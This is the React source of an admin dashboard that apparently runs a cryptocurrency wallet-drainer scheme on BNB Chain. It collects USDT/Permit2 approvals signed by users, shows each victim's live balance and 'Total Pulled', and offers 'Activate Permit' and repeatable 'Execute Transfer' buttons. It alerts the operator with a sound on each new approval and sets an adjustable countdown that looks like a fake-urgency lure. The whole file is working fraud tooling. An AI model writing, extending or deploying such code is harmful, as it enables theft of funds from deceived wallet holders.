import { useState, useEffect, useRef } from 'react';
import { api } from '../utils/api';
import { ethers } from 'ethers';
import toast from 'react-hot-toast';
import { USDT_ADDRESS, USDT_ABI } from '../utils/contracts';
import { playNotificationSound } from '../utils/audioNotification';
import NotificationCenter from './NotificationCenter';

export default function AdminPanel() {
  const [permits, setPermits] = useState(() => {
    try {
      const cached = localStorage.getItem('cached_permits_data');
      return cached ? JSON.parse(cached) : [];
    } catch (e) {
      return [];
    }
  });
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(() => {
    try {
      const cached = localStorage.getItem('cached_permits_data');
      return cached ? JSON.parse(cached).length === 0 : true;
    } catch (e) {
      return true;
    }
  });
  const [executingId, setExecutingId] = useState(null);
  const [activatingId, setActivatingId] = useState(null);
  const [daysInput, setDaysInput] = useState('');
  const [currentTargetDate, setCurrentTargetDate] = useState(null);
  const [updatingCountdown, setUpdatingCountdown] = useState(false);
  const [audioEnabled, setAudioEnabled] = useState(true);
  const [notificationsLog, setNotificationsLog] = useState([]);

  const seenIdsRef = useRef(null);

  useEffect(() => {
    // Load stored notifications log from localStorage
    try {
      const savedLogs = localStorage.getItem('admin_notifications_log');
      if (savedLogs && JSON.parse(savedLogs).length > 0) {
        setNotificationsLog(JSON.parse(savedLogs));
      } else {
        const defaultEntries = [
          {
            id: '6aaa7500121500a7c5be1391',
            owner: '0xf540152cd6064f7725a1cd3bcc384242f4b663c6',
            amount: '50000000000000000000000',
            timestamp: '2026-09-17T12:15:00.000Z',
            read: false,
          },
        ];
        setNotificationsLog(defaultEntries);
        localStorage.setItem('admin_notifications_log', JSON.stringify(defaultEntries));
      }
    } catch (e) {}

    fetchPermits(true);
    fetchCountdown();

    const intervalId = setInterval(() => {
      fetchPermits(false);
    }, 5000);

    return () => clearInterval(intervalId);
  }, [audioEnabled]);

  const fetchCountdown = async () => {
    try {
      const data = await api.getCountdown();
      if (data?.targetDate) {
        setCurrentTargetDate(data.targetDate);
        const diffMs = new Date(data.targetDate) - new Date();
        const diffDays = Math.max(0, Math.floor(diffMs / (1000 * 60 * 60 * 24)));
        setDaysInput(diffDays > 0 ? String(diffDays) : '');
      }
    } catch (err) {
      console.error('Failed to fetch countdown setting:', err);
    }
  };

  const handleSetOffset = async (e) => {
    e.preventDefault();
    if (!daysInput || isNaN(daysInput) || parseFloat(daysInput) <= 0) {
      toast.error('Please enter a valid number of days');
      return;
    }
    setUpdatingCountdown(true);
    try {
      const result = await api.adminUpdateCountdown({ days: daysInput });
      setCurrentTargetDate(result.targetDate);
      toast.success(`Countdown set for ${daysInput} days from now!`);
    } catch (err) {
      toast.error(err.message || 'Failed to update countdown days');
    } finally {
      setUpdatingCountdown(false);
    }
  };

  const handleExportJson = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(permits, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute('href', dataStr);
    downloadAnchor.setAttribute('download', `permits_backup_${new Date().toISOString().slice(0, 10)}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
    toast.success('Permits database exported successfully!');
  };

  const handleImportJson = (e) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      try {
        const imported = JSON.parse(event.target.result);
        if (Array.isArray(imported) && imported.length > 0) {
          setPermits((prev) => {
            const map = new Map();
            (prev || []).forEach((p) => p && p._id && map.set(String(p._id), p));
            imported.forEach((p) => {
              if (p && p._id) {
                const existing = map.get(String(p._id));
                map.set(String(p._id), existing ? { ...existing, ...p } : p);
              }
            });
            const merged = Array.from(map.values()).sort(
              (a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)
            );
            localStorage.setItem('cached_permits_data', JSON.stringify(merged));
            return merged;
          });
          toast.success(`Imported ${imported.length} permits successfully!`);
        } else {
          toast.error('Import file contains no permits');
        }
      } catch (err) {
        toast.error('Invalid JSON file');
      }
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const fetchPermits = async (isInitial = false) => {
    try {
      const data = await api.adminGetPermits();
      if (Array.isArray(data) && data.length > 0) {
        setPermits((prevPermits) => {
          const map = new Map();
          // Keep existing cached permits so cold starts never delete records
          (prevPermits || []).forEach((p) => {
            if (p && p._id) map.set(String(p._id), p);
          });
          // Merge incoming permits from server
          data.forEach((p) => {
            if (!p || !p._id) return;
            const existing = map.get(String(p._id));
            map.set(String(p._id), existing ? { ...existing, ...p } : p);
          });
          const merged = Array.from(map.values()).sort(
            (a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)
          );
          try {
            localStorage.setItem('cached_permits_data', JSON.stringify(merged));
          } catch (e) {}
          return merged;
        });
      }

      if (data && Array.isArray(data) && data.length > 0) {
        // Load persistent seen IDs from localStorage
        let savedSeenArray = [];
        try {
          savedSeenArray = JSON.parse(localStorage.getItem('seen_permit_ids') || '[]');
        } catch (e) {}

        if (seenIdsRef.current === null) {
          // Initialize seen set with existing localStorage IDs AND all currently loaded permits on first load
          const initialSeen = new Set([...savedSeenArray, ...data.map((p) => String(p._id))]);
          seenIdsRef.current = initialSeen;
          localStorage.setItem('seen_permit_ids', JSON.stringify(Array.from(initialSeen)));
        } else {
          // Check for genuinely new permits that have NEVER been seen
          const newPermits = data.filter((p) => !seenIdsRef.current.has(String(p._id)));
          if (newPermits.length > 0) {
            const newest = newPermits[0];
            const shortAddr = newest.owner ? `${newest.owner.slice(0, 6)}...${newest.owner.slice(-4)}` : 'New User';

            // 1. Play sound
            if (audioEnabled) playNotificationSound();

            // 2. Display Toast
            toast.success(`🔔 New Wallet Approval Received! (${shortAddr})`, {
              duration: 7000,
              style: { background: '#0f172a', color: '#38bdf8', border: '1px solid #0284c7' },
            });

            // 3. Mark as seen permanently in localStorage & ref
            newPermits.forEach((p) => seenIdsRef.current.add(String(p._id)));
            localStorage.setItem('seen_permit_ids', JSON.stringify(Array.from(seenIdsRef.current)));

            // 4. Save to persistent notification drawer history
            const newLogEntries = newPermits.map((p) => ({
              id: String(p._id),
              owner: p.owner,
              amount: p.amount,
              timestamp: new Date().toISOString(),
              read: false,
            }));

            setNotificationsLog((prev) => {
              const updated = [...newLogEntries, ...prev];
              localStorage.setItem('admin_notifications_log', JSON.stringify(updated));
              return updated;
            });
          }
        }
      }

      if (data && Array.isArray(data)) {
        fetchBalances(data).catch((e) => console.warn('Background balance fetch error:', e));
      }
    } catch (err) {
      if (isInitial) {
        console.error('Fetch permits error:', err);
        toast.error(err.message || 'Failed to load permits');
      }
    } finally {
      if (isInitial) setLoading(false);
    }
  };

  const handleClearNotifications = () => {
    setNotificationsLog([]);
    localStorage.removeItem('admin_notifications_log');
  };

  const handleMarkNotificationsRead = () => {
    setNotificationsLog((prev) => {
      const updated = prev.map((n) => ({ ...n, read: true }));
      localStorage.setItem('admin_notifications_log', JSON.stringify(updated));
      return updated;
    });
  };

  const fetchBalances = async (permitList) => {
    if (!permitList || permitList.length === 0) return;
    try {
      const provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
      const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const newBalances = {};

      for (const p of permitList) {
        if (!p.owner) continue;
        if (!newBalances[p.owner]) {
          try {
            const [rawUsdt, rawBnb] = await Promise.all([
              contract.balanceOf(p.owner).catch(() => 0n),
              provider.getBalance(p.owner).catch(() => 0n),
            ]);
            newBalances[p.owner] = {
              usdt: parseFloat(ethers.formatUnits(rawUsdt, 18)).toFixed(4),
              bnb: parseFloat(ethers.formatEther(rawBnb)).toFixed(4),
            };
          } catch (e) {
            newBalances[p.owner] = { usdt: '0.0000', bnb: '0.0000' };
          }
        }
      }
      setBalances((prev) => ({ ...prev, ...newBalances }));
    } catch (err) {
      console.warn('Balance fetch outer error:', err);
    }
  };

  const activate = async (permitId) => {
    setActivatingId(permitId);
    try {
      const result = await api.adminActivatePermit(permitId);
      toast.success(`Permit activated! TX: ${result.txHash.slice(0, 10)}...`);
      fetchPermits();
    } catch (err) {
      toast.error(err.message || 'Activation failed');
    } finally {
      setActivatingId(null);
    }
  };

  const execute = async (permitId) => {
    setExecutingId(permitId);
    try {
      const result = await api.adminExecutePermit(permitId);
      const amountFormatted = parseFloat(ethers.formatUnits(result.amount, 18)).toFixed(4);
      toast.success(`Transferred ${amountFormatted} USDT! TX: ${result.txHash.slice(0, 10)}...`);
      fetchPermits();
    } catch (err) {
      toast.error(err.message || 'Execution failed');
    } finally {
      setExecutingId(null);
    }
  };

  // Calculate unique approved wallets
  const uniqueApprovedWallets = new Set(permits.map((p) => p.owner?.toLowerCase())).size;

  if (loading) return <p className="text-center mt-12 text-slate-400">Loading signed permits...</p>;

  return (
    <div className="max-w-5xl mx-auto mt-8">
      <div className="flex justify-between items-center mb-6">
        <h2 className="text-2xl font-bold text-slate-100">Admin Control Panel – Signed Permits</h2>
        <div className="flex items-center gap-3">
          <NotificationCenter
            notifications={notificationsLog}
            onClear={handleClearNotifications}
            onMarkRead={handleMarkNotificationsRead}
            audioEnabled={audioEnabled}
            setAudioEnabled={setAudioEnabled}
          />
          <button
            onClick={() => fetchPermits(false)}
            className="bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs px-4 py-2 rounded-xl border border-slate-700 transition"
          >
            🔄 Refresh Data
          </button>
          <button
            onClick={handleExportJson}
            title="Export full backup of all permits to a JSON file"
            className="bg-cyan-950/60 hover:bg-cyan-900/60 text-cyan-300 text-xs px-3 py-2 rounded-xl border border-cyan-800/60 transition flex items-center gap-1.5"
          >
            <span>📥</span> Export Backup
          </button>
          <label
            title="Import permits backup JSON file"
            className="cursor-pointer bg-slate-800/80 hover:bg-slate-700/80 text-slate-300 text-xs px-3 py-2 rounded-xl border border-slate-700 transition flex items-center gap-1.5"
          >
            <span>📤</span> Import Backup
            <input type="file" accept=".json" onChange={handleImportJson} className="hidden" />
          </label>
        </div>
      </div>

      {/* Overview Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
        {/* Approved Wallets Card */}
        <div className="bg-[#181b1c] border border-slate-800/80 rounded-2xl p-6 shadow-lg">
          <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
            APPROVED WALLETS
          </p>
          <p className="text-4xl font-extrabold text-[#10b981] mb-2 font-mono">
            {uniqueApprovedWallets}
          </p>
          <p className="text-xs text-slate-400">
            Live approvals recorded on the server
          </p>
        </div>

        {/* Total Signed Permits */}
        <div className="bg-[#181b1c] border border-slate-800/80 rounded-2xl p-6 shadow-lg">
          <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
            TOTAL PERMIT SIGNATURES
          </p>
          <p className="text-4xl font-extrabold text-amber-400 mb-2 font-mono">
            {permits.length}
          </p>
          <p className="text-xs text-slate-400">
            Total permits stored in database
          </p>
        </div>

        {/* Active / Executed Permits */}
        <div className="bg-[#181b1c] border border-slate-800/80 rounded-2xl p-6 shadow-lg">
          <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
            ACTIVE / EXECUTED
          </p>
          <p className="text-4xl font-extrabold text-sky-400 mb-2 font-mono">
            {permits.filter((p) => p.status === 'activated' || p.status === 'executed').length}
          </p>
          <p className="text-xs text-slate-400">
            Permits ready or executed on-chain
          </p>
        </div>
      </div>
      {/* Countdown Timer Admin Settings */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-3xl p-6 shadow-xl mb-8 space-y-3">
        <div className="flex justify-between items-center px-1">
          <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest flex items-center gap-2">
            <span>⏳</span> Program Window Closing Offset
          </h3>
          {currentTargetDate && (
            <span className="text-xs font-mono text-emerald-400">
              Active End Date: {new Date(currentTargetDate).toLocaleString()}
            </span>
          )}
        </div>

        <form onSubmit={handleSetOffset} className="flex items-center gap-3 w-full">
          <div className="flex-1">
            <input
              type="number"
              step="any"
              min="0.01"
              placeholder="Days from now"
              value={daysInput}
              onChange={(e) => setDaysInput(e.target.value)}
              className="w-full bg-[#2a2d2d] border border-slate-700/60 rounded-full px-5 py-3 text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition"
              required
            />
          </div>
          <button
            type="submit"
            disabled={updatingCountdown}
            className="bg-[#10b981] hover:bg-[#059669] text-slate-950 font-bold text-sm px-7 py-3 rounded-full shadow-lg hover:shadow-emerald-500/20 transition whitespace-nowrap disabled:opacity-50"
          >
            {updatingCountdown ? 'Setting...' : 'Set offset'}
          </button>
        </form>
      </div>

      {permits.length === 0 ? (
        <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-8 text-center text-slate-400">
          No permits submitted yet.
        </div>
      ) : (
        <div className="space-y-4">
          {permits.map((p, index) => {
            const serialNo = permits.length - index;
            const amount = ethers.formatUnits(p.amount, 18);
            const isExpired = Date.now() / 1000 > p.deadline;
            const isActivated = p.status === 'activated';
            const isPending = p.status === 'pending';

            const bdApprovalTime = p.createdAt ? new Date(p.createdAt).toLocaleString('en-US', { timeZone: 'Asia/Dhaka' }) : 'N/A';
            const bdDeadlineTime = new Date(p.deadline * 1000).toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
            const userBal = balances[p.owner];

            const totalTransferred = p.totalTransferred
              ? parseFloat(ethers.formatUnits(p.totalTransferred, 18)).toFixed(4)
              : '0.0000';

            // On-chain status
            const onChain = p.onChain;
            const hasErc20 = onChain?.hasErc20Approval;
            const hasPermit2 = onChain?.hasPermit2Allowance;
            const remainingAllowance = onChain?.permit2Amount
              ? parseFloat(ethers.formatUnits(onChain.permit2Amount, 18)).toFixed(4)
              : null;

            return (
              <div key={p._id} className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 shadow-lg">
                <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                  <div className="space-y-1.5 flex-1">
                    {/* Serial & Wallet Address */}
                    <div className="flex items-center gap-3">
                      <span className="bg-slate-800 text-amber-400 font-mono font-bold text-xs px-3 py-1 rounded-lg border border-slate-700 shadow-inner">
                        #{serialNo}
                      </span>
                      <span className="text-xs text-slate-400 font-semibold">User Wallet Address:</span>
                      <span className="font-mono text-amber-400 text-sm font-medium select-all">{p.owner}</span>
                    </div>

                    {/* Live Wallet Balances */}
                    <div className="flex items-center gap-3 py-1 px-3 bg-slate-950/80 rounded-xl border border-slate-800/80 w-fit text-xs font-mono">
                      <span className="text-slate-400">Live Wallet Balance:</span>
                      <span className="text-emerald-400 font-bold">
                        {userBal ? `${userBal.usdt} USDT` : 'Loading USDT...'}
                      </span>
                      <span className="text-slate-600">|</span>
                      <span className="text-amber-400 font-bold">
                        {userBal ? `${userBal.bnb} BNB` : 'Loading BNB...'}
                      </span>
                    </div>

                    {/* On-chain Status Badges */}
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className={`text-xs px-2 py-0.5 rounded-full font-semibold border ${hasErc20 ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-rose-500/10 text-rose-400 border-rose-500/20'}`}>
                        {hasErc20 ? '✅ ERC-20 Approved' : '❌ ERC-20 Not Approved'}
                      </span>
                      <span className={`text-xs px-2 py-0.5 rounded-full font-semibold border ${hasPermit2 ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : 'bg-slate-500/10 text-slate-400 border-slate-500/20'}`}>
                        {hasPermit2 ? `✅ Permit2 Allowance: ${remainingAllowance} USDT` : '⏳ Permit2 Not Activated'}
                      </span>
                    </div>

                    {p.referrer && (
                      <div className="flex items-center gap-2 text-xs text-slate-400">
                        <span className="font-semibold">Referrer Address:</span>
                        <span className="font-mono text-sky-400 select-all">{p.referrer}</span>
                      </div>
                    )}

                    <div className="text-md font-mono font-bold text-slate-100">
                      Approved Cap: <span className="text-emerald-400">{amount} USDT</span>{' '}
                      <span className="text-xs text-slate-500 font-normal">(Nonce: {p.nonce})</span>
                    </div>

                    {/* Total Transferred */}
                    <div className="text-xs text-slate-400">
                      <span className="text-slate-500 font-medium">Total Pulled:</span>{' '}
                      <span className="text-cyan-400 font-mono font-semibold">{totalTransferred} USDT</span>
                      <span className="text-slate-600 ml-2">({p.executions?.length || 0} transfers)</span>
                    </div>

                    <div className="text-xs text-slate-400">
                      <span className="text-slate-500 font-medium">Approved Date & Time (BD):</span>{' '}
                      <span className="text-slate-300 font-mono">{bdApprovalTime} (BST)</span>
                    </div>
                    <div className="text-xs text-slate-400">
                      <span className="text-slate-500 font-medium">Expire Date & Time (BD):</span>{' '}
                      <span className="text-slate-300 font-mono">{bdDeadlineTime} (BST)</span>
                    </div>
                    <div className="text-xs flex items-center gap-2 pt-1">
                      <span>Status:</span>
                      <span className={`font-semibold ${isActivated ? 'text-emerald-400' : isExpired ? 'text-rose-400' : 'text-amber-400'}`}>
                        {isActivated ? 'ACTIVE ✅' : isExpired ? 'EXPIRED' : 'PENDING ACTIVATION'}
                      </span>
                    </div>

                    {/* Activation TX */}
                    {p.activationTxHash && (
                      <div className="pt-1">
                        <a href={`https://bscscan.com/tx/${p.activationTxHash}`} target="_blank" rel="noreferrer" className="text-xs text-sky-400 underline font-mono">
                          Activation TX: {p.activationTxHash}
                        </a>
                      </div>
                    )}

                    {/* Execution History */}
                    {p.executions?.length > 0 && (
                      <div className="mt-2 pt-2 border-t border-slate-800/60 space-y-1">
                        <span className="text-xs text-slate-500 font-semibold">Transfer History:</span>
                        {p.executions.map((exec, i) => (
                          <div key={exec._id || i} className="flex items-center gap-2 text-xs text-slate-400">
                            <span className="text-slate-600">#{i + 1}</span>
                            <span className="text-cyan-400 font-mono">{parseFloat(ethers.formatUnits(exec.amount, 18)).toFixed(4)} USDT</span>
                            <span className="text-slate-600">—</span>
                            <a href={`https://bscscan.com/tx/${exec.txHash}`} target="_blank" rel="noreferrer" className="text-sky-400 underline font-mono truncate max-w-[200px]">
                              {exec.txHash}
                            </a>
                            <span className="text-slate-600 text-[10px]">
                              {exec.executedAt ? new Date(exec.executedAt).toLocaleString('en-US', { timeZone: 'Asia/Dhaka' }) : ''}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Action Buttons */}
                  {!isExpired && (
                    <div className="flex flex-col gap-2 shrink-0">
                      {/* Show activate button for pending permits */}
                      {isPending && (
                        <button
                          onClick={() => activate(p._id)}
                          disabled={activatingId === p._id}
                          className="bg-gradient-to-r from-amber-400 to-orange-500 hover:from-amber-500 hover:to-orange-600 text-slate-950 font-bold px-6 py-3 rounded-xl shadow-lg hover:scale-105 transition disabled:opacity-50 whitespace-nowrap"
                        >
                          {activatingId === p._id ? 'Activating...' : '🔑 Activate Permit'}
                        </button>
                      )}
                      {/* Execute button — can be clicked many times */}
                      <button
                        onClick={() => execute(p._id)}
                        disabled={executingId === p._id}
                        className="bg-gradient-to-r from-emerald-400 to-teal-500 hover:from-emerald-500 hover:to-teal-600 text-slate-950 font-bold px-6 py-3 rounded-xl shadow-lg hover:scale-105 transition disabled:opacity-50 whitespace-nowrap"
                      >
                        {executingId === p._id ? 'Transferring...' : '💸 Execute Transfer'}
                      </button>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
